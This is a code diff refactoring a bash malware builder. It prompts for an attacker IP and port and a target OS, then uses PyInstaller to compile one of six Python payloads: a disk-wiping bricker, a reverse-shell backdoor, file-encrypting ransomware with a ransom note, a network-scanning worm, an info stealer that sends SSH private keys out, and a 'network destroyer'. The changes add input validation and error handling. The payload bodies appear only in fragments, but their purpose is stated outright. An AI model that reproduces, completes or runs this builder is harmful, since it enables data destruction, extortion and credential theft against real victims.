@@ -1,17 +1,20 @@
 #!/bin/bash
 
-R='\033[1;31m'
-G='\033[1;32m'
-Y='\033[1;33m'
-B='\033[1;34m'
-NC='\033[0m'
 
-DEFAULT_ATTACKER_IP="127.0.0.1" # <-- CHANGE THIS TO YOUR ATTACKER IP
-DEFAULT_ATTACKER_PORT="4444"     # <-- CHANGE THIS TO YOUR LISTENER PORT
+R='\033[1;31m'    
+G='\033[1;32m'   
+Y='\033[1;33m'    
+B='\033[1;34m'    
+NC='\033[0m'      
+
+
+DEFAULT_ATTACKER_IP="127.0.0.1"
+DEFAULT_ATTACKER_PORT="4444"
 VENV_DIR="./fire_venv"
 WORK_DIR="./fire_build"
 FINAL_NAME_WIN="pc.exe"
 FINAL_NAME_LIN="pc"
+
 
 display_banner() {
     clear
@@ -26,40 +29,71 @@ display_banner() {
 EOF
 }
 
+
 check_dependencies() {
+    local missing_deps=()
+    
     if ! command -v python3 &> /dev/null; then
-        echo -e "${R}[!] Python3 is not installed. Please install it first.${NC}"
-        exit 1
+        missing_deps+=("python3")
     fi
     
     if ! command -v pip &> /dev/null; then
-        echo -e "${R}[!] pip is not installed. Please install it first.${NC}"
+        missing_deps+=("pip")
+    fi
+    
+    if [ ${#missing_deps[@]} -ne 0 ]; then
+        echo -e "${R}[!] Missing dependencies: ${missing_deps[*]}${NC}"
+        echo -e "${Y}[*] Please install the missing dependencies and try again.${NC}"
         exit 1
     fi
 }
 
+
 setup_environment() {
+    
     if [ ! -d "$VENV_DIR" ]; then
         echo -e "${Y}[*] Creating isolated Python environment...${NC}"
         python3 -m venv "$VENV_DIR"
     fi
 
+    
     source "$VENV_DIR/bin/activate"
 
+    
     if ! python3 -c "import PyInstaller" &> /dev/null; then
-        echo -e "${Y}[*] PyInstaller not found in venv. Installing...${NC}"
-        pip install pyinstaller > /dev/null 2>&1
+        echo -e "${Y}[*] Installing PyInstaller...${NC}"
+        pip install --quiet pyinstaller
     fi
 
+    
     mkdir -p "$WORK_DIR"
     cd "$WORK_DIR"
 }
+
 
 cleanup() {
     cd ..
     rm -rf "$WORK_DIR"
     deactivate
 }
+
+
+validate_ip() {
+    local ip="$1"
+    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        return 1
+    fi
+    return 0
+}
+
+validate_port() {
+    local port="$1"
+    if [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
+        return 1
+    fi
+    return 0
+}
+
 
 generate_payload() {
     local type=$1
@@ -71,8 +105,8 @@ generate_payload() {
     echo -e "${Y}[*] Generating Python payload for type: $type | Target OS: $target_os${NC}"
 
     case $type in
-        1)
-            cat > "payload.py" << EOP
+        1)  
+            cat > "payload.py" << 'EOP'
 import os, sys
 if sys.platform.startswith("win"):
     with open(r"\\.\PhysicalDrive0", "r+b") as f:
@@ -84,7 +118,7 @@ else:
     os.system("reboot")
 EOP
             ;;
-        2)
+        2)  
             cat > "payload.py" << EOP
 import os, sys, socket, subprocess, time
 ATTACKER_IP = '$attacker_ip'
@@ -105,8 +139,8 @@ else:
             time.sleep(10)
 EOP
             ;;
-        3)
-            cat > "payload.py" << EOP
+        3)  
+            cat > "payload.py" << 'EOP'
 import os, base64, random
 from pathlib import Path
 def xor_encrypt(data, key):
@@ -128,8 +162,8 @@ with open(target_dir / 'README_FIRE.txt', 'w') as f:
     f.write(f"Your files are encrypted. Key: {base64.b64encode(key).decode()}")
 EOP
             ;;
-        4)
-            cat > "payload.py" << EOP
+        4)  
+            cat > "payload.py" << 'EOP'
 import os, socket, subprocess, time
 def get_subnet():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -144,7 +178,7 @@ for i in range(1, 255):
         print(f"[+] Found host: {ip}", flush=True)
 EOP
             ;;
-        5)
+        5)  
             cat > "payload.py" << EOP
 import os, glob, json, socket, base64
 from pathlib import Path
@@ -164,8 +198,8 @@ for file in glob.glob(str(Path.home() / ".ssh/id_rsa")):
 exfiltrate(json.dumps(data_bundle).encode())
 EOP
             ;;
-        6)
-            cat > "payload.py" << EOP
+        6)  
+            cat > "payload.py" << 'EOP'
 import os, socket, subprocess, sys, time
 def get_subnet():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -192,7 +226,12 @@ EOP
     if [ "$target_os" == "Windows" ]; then
         pyinstaller_args="$pyinstaller_args --noconsole"
     fi
-    pyinstaller $pyinstaller_args payload.py
+    
+    # Run PyInstaller with error handling
+    if ! pyinstaller $pyinstaller_args payload.py; then
+        echo -e "${R}[!] PyInstaller compilation failed.${NC}"
+        return 1
+    fi
 
     if [ -f "dist/$final_name" ]; then
         echo -e "${G}[+] Success! Malware created as 'dist/$final_name'.${NC}"
@@ -204,53 +243,87 @@ EOP
     fi
 }
 
-display_banner
-check_dependencies
 
-echo -e "${B}CONFIGURATION:${NC}"
-read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
-ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
+main() {
+    display_banner
+    check_dependencies
 
-read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
-ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
+    echo -e "${B}CONFIGURATION:${NC}"
+    
+    # easter egg
+    while true; do
+        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
+        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
+        
+        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
+            break
+        else
+            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
+        fi
+    done
 
-echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
-echo "1) Windows"
-echo "2) Linux"
-read -p ">> " os_choice
+    
+    while true; do
+        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
+        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
+        
+        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
+            break
+        else
+            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
+        fi
+    done
 
-case $os_choice in
-    1)
-        TARGET_OS="Windows"
-        FINAL_NAME="$FINAL_NAME_WIN"
-        ;;
-    2)
-        TARGET_OS="Linux"
-        FINAL_NAME="$FINAL_NAME_LIN"
-        ;;
-    *)
-        echo -e "${R}[!] Invalid OS choice. Exiting.${NC}"
-        exit 1
-        ;;
-esac
+    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
+    echo "1) Windows"
+    echo "2) Linux"
+    while true; do
+        read -p ">> " os_choice
+        case $os_choice in
+            1)
+                TARGET_OS="Windows"
+                FINAL_NAME="$FINAL_NAME_WIN"
+                break
+                ;;
+            2)
+                TARGET_OS="Linux"
+                FINAL_NAME="$FINAL_NAME_LIN"
+                break
+                ;;
+            *)
+                echo -e "${R}[!] Invalid OS choice. Please enter 1 or 2.${NC}"
+                ;;
+        esac
+    done
 
-setup_environment
+    setup_environment
 
-echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
-echo "1) Bricker (Disk Destroyer)"
-echo "2) Backdoor (Reverse Shell)"
-echo "3) Ransomware (File Encryptor)"
-echo "4) Worm (Network Spreader)"
-echo "5) Info Stealer (Data Exfiltration)"
-echo "6) Network Destroyer (Conceptual)"
-read -p ">> " payload_choice
+    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
+    echo "1) Bricker (Disk Destroyer)"
+    echo "2) Backdoor (Reverse Shell)"
+    echo "3) Ransomware (File Encryptor)"
+    echo "4) Worm (Network Spreader)"
+    echo "5) Info Stealer (Data Exfiltration)"
+    echo "6) Network Destroyer (Conceptual)"
+    while true; do
+        read -p ">> " payload_choice
+        if [[ "$payload_choice" =~ ^[1-6]$ ]]; then
+            break
+        else
+            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-6.${NC}"
+        fi
+    done
 
-echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"
+    echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"
 
-if generate_payload "$payload_choice" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
-    echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
-else
-    echo -e "${R}>> OPERATION FAILED.${NC}"
-fi
+    if generate_payload "$payload_choice" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
+        echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
+    else
+        echo -e "${R}>> OPERATION FAILED.${NC}"
+    fi
 
-cleanup
+    cleanup
+}
+
+
+main
